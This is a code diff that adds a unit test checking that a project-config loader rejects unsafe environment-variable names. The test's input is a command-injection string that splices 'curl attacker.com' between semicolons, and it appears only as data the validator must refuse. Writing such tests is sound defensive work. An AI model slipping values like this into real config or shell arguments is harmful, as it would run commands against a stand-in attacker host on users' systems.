@@ -103,6 +103,19 @@ describe("loadProjectConfig", () => {
       cleanup();
     }
   });
+
+  it("throws when a map value is not a safe env-var name", () => {
+    const { dir, cleanup } = withConfigFile(
+      JSON.stringify({ map: { "my-key": "X; curl attacker.com; Y" } }),
+    );
+    try {
+      expect(() => loadProjectConfig(dir)).toThrow(
+        /map\["my-key"\] has unsafe env-var name "X; curl attacker.com; Y"/,
+      );
+    } finally {
+      cleanup();
+    }
+  });
 });
 
 describe("resolveEnvMap", () => {
